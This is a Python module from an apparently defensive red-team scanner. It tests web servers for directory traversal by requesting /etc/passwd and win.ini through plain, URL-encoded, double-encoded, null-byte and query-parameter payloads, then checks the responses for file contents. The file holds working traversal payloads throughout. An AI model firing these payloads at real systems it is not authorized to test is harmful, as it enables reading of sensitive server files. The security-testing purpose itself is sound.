"""Directory / path traversal vulnerability tests.

Attempts to read files outside the web root using various path traversal
techniques including encoding bypasses, null byte injection, and
parameter-based traversal.

Evaluation:
- Response contains Unix passwd file content (root:) -> VULNERABLE
- Response contains Windows win.ini content ([fonts]) -> VULNERABLE
- Server returns 400/403/404 or sanitizes path -> DEFENDED
"""

import time
import logging

from redteam.base import Attack, AttackResult, Severity, Status

logger = logging.getLogger(__name__)


class DirectoryTraversalAttack(Attack):
    """Test for path traversal vulnerabilities."""

    name = "web.directory_traversal"
    category = "web"
    severity = Severity.HIGH
    description = "Path traversal and local file inclusion tests"
    target_types = {"generic"}

    # Unix passwd file indicators
    UNIX_INDICATORS = ["root:", "daemon:", "bin:", "nobody:"]
    # Windows win.ini indicators
    WIN_INDICATORS = ["[fonts]", "[extensions]", "[mci extensions]"]

    async def execute(self, client) -> list[AttackResult]:
        """Run all directory traversal variants."""
        results = []

        results.append(await self._test_basic_traversal(client))
        results.append(await self._test_windows_traversal(client))
        results.append(await self._test_null_byte_traversal(client))
        results.extend(await self._test_param_traversal(client))

        return results

    def _contains_unix_passwd(self, body: str) -> bool:
        """Check if response body contains Unix passwd file content."""
        body_lower = body.lower()
        return any(ind in body_lower for ind in self.UNIX_INDICATORS)

    def _contains_win_ini(self, body: str) -> bool:
        """Check if response body contains Windows win.ini content."""
        body_lower = body.lower()
        return any(ind in body_lower for ind in self.WIN_INDICATORS)

    async def _test_basic_traversal(self, client) -> AttackResult:
        """Try basic Unix path traversal payloads."""
        start = time.monotonic()
        payloads = [
            "/../../../etc/passwd",
            "/../../../../../../etc/passwd",
            "/..%2f..%2f..%2fetc%2fpasswd",
            "/....//....//....//etc/passwd",
            "/..%252f..%252f..%252fetc/passwd",
        ]
        try:
            for payload in payloads:
                status_code, body, headers = await client.get(payload, cookies={})
                if self._contains_unix_passwd(body):
                    return self._make_result(
                        variant="basic_traversal",
                        status=Status.VULNERABLE,
                        evidence=f"Payload {payload} returned passwd file content",
                        details=f"Path traversal successful with payload: {payload}",
                        request={"path": payload},
                        response={"status": status_code, "body_preview": body[:300]},
                        duration_ms=(time.monotonic() - start) * 1000,
                    )

            return self._make_result(
                variant="basic_traversal",
                status=Status.DEFENDED,
                evidence="No traversal payloads returned sensitive file content",
                details=f"Tested {len(payloads)} basic traversal payloads, none succeeded",
                request={"payloads_tested": len(payloads)},
                duration_ms=(time.monotonic() - start) * 1000,
            )
        except Exception as e:
            return self._make_result(
                variant="basic_traversal",
                status=Status.ERROR,
                details=str(e),
                duration_ms=(time.monotonic() - start) * 1000,
            )

    async def _test_windows_traversal(self, client) -> AttackResult:
        """Try Windows-style path traversal payloads."""
        start = time.monotonic()
        payloads = [
            "/..\\..\\..\\..\\windows\\win.ini",
            "/..%5c..%5c..%5cwindows%5cwin.ini",
            "/..%255c..%255c..%255cwindows%255cwin.ini",
        ]
        try:
            for payload in payloads:
                status_code, body, headers = await client.get(payload, cookies={})
                if self._contains_win_ini(body):
                    return self._make_result(
                        variant="windows_traversal",
                        status=Status.VULNERABLE,
                        evidence=f"Payload {payload} returned win.ini content",
                        details=f"Windows path traversal successful with payload: {payload}",
                        request={"path": payload},
                        response={"status": status_code, "body_preview": body[:300]},
                        duration_ms=(time.monotonic() - start) * 1000,
                    )

            return self._make_result(
                variant="windows_traversal",
                status=Status.DEFENDED,
                evidence="No Windows traversal payloads returned sensitive file content",
                details=f"Tested {len(payloads)} Windows traversal payloads, none succeeded",
                request={"payloads_tested": len(payloads)},
                duration_ms=(time.monotonic() - start) * 1000,
            )
        except Exception as e:
            return self._make_result(
                variant="windows_traversal",
                status=Status.ERROR,
                details=str(e),
                duration_ms=(time.monotonic() - start) * 1000,
            )

    async def _test_null_byte_traversal(self, client) -> AttackResult:
        """Test null byte truncation to bypass extension checks."""
        start = time.monotonic()
        payloads = [
            "/../../../etc/passwd%00.jpg",
            "/../../../etc/passwd%00.html",
            "/../../../etc/passwd%00.png",
        ]
        try:
            for payload in payloads:
                status_code, body, headers = await client.get(payload, cookies={})
                if self._contains_unix_passwd(body):
                    return self._make_result(
                        variant="null_byte_traversal",
                        status=Status.VULNERABLE,
                        evidence=f"Null byte payload {payload} returned passwd content",
                        details="Null byte truncation bypassed file extension validation",
                        request={"path": payload},
                        response={"status": status_code, "body_preview": body[:300]},
                        duration_ms=(time.monotonic() - start) * 1000,
                    )

            return self._make_result(
                variant="null_byte_traversal",
                status=Status.DEFENDED,
                evidence="Null byte traversal payloads did not return sensitive content",
                details=f"Tested {len(payloads)} null byte payloads, none succeeded",
                request={"payloads_tested": len(payloads)},
                duration_ms=(time.monotonic() - start) * 1000,
            )
        except Exception as e:
            return self._make_result(
                variant="null_byte_traversal",
                status=Status.ERROR,
                details=str(e),
                duration_ms=(time.monotonic() - start) * 1000,
            )

    async def _test_param_traversal(self, client) -> list[AttackResult]:
        """Try traversal via common query parameters on each test endpoint."""
        endpoints = self._get_test_endpoints()
        param_names = ["file", "path", "page", "template", "doc", "include"]
        traversal_value = "../../../etc/passwd"
        results = []

        for endpoint in endpoints:
            start = time.monotonic()
            try:
                vulnerable_param = None
                for param in param_names:
                    status_code, body, headers = await client.get(
                        endpoint,
                        params={param: traversal_value},
                        cookies={},
                    )
                    if self._contains_unix_passwd(body):
                        vulnerable_param = param
                        break

                if vulnerable_param:
                    results.append(self._make_result(
                        variant="dot_dot_slash_in_params",
                        status=Status.VULNERABLE,
                        evidence=f"Parameter '{vulnerable_param}' on {endpoint} returned passwd content",
                        details=f"Path traversal via query parameter ?{vulnerable_param}={traversal_value}",
                        request={"endpoint": endpoint, "param": vulnerable_param, "value": traversal_value},
                        response={"status": status_code, "body_preview": body[:300]},
                        duration_ms=(time.monotonic() - start) * 1000,
                    ))
                else:
                    results.append(self._make_result(
                        variant="dot_dot_slash_in_params",
                        status=Status.DEFENDED,
                        evidence=f"No parameter traversal succeeded on {endpoint}",
                        details=f"Tested {len(param_names)} parameter names on {endpoint}",
                        request={"endpoint": endpoint, "params_tested": param_names},
                        duration_ms=(time.monotonic() - start) * 1000,
                    ))
            except Exception as e:
                results.append(self._make_result(
                    variant="dot_dot_slash_in_params",
                    status=Status.ERROR,
                    details=f"Error testing {endpoint}: {e}",
                    duration_ms=(time.monotonic() - start) * 1000,
                ))

        return results

    async def cleanup(self, client) -> None:
        """No persistent state created by traversal tests."""
        pass
